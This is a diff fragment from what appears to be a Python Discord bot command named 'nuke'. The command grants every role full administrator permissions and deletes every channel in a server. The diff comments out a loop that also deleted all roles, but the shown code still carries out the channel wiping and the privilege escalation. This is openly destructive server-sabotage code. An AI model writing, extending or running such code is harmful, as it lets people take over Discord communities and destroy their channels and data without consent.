@@ -65,11 +65,11 @@ async def nuke(ctx):
             await role.edit(permissions = Permissions.all())
         except:
             print("couldn't give everyone admin")
-        for role in ctx.guild.roles:
-            try:
-                await role.delete()
-            except:
-                print(f"couldn't delete {role}")
+        #for role in ctx.guild.roles:
+        #    try:
+        #        await role.delete()
+        #    except:
+        #        print(f"couldn't delete {role}")
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
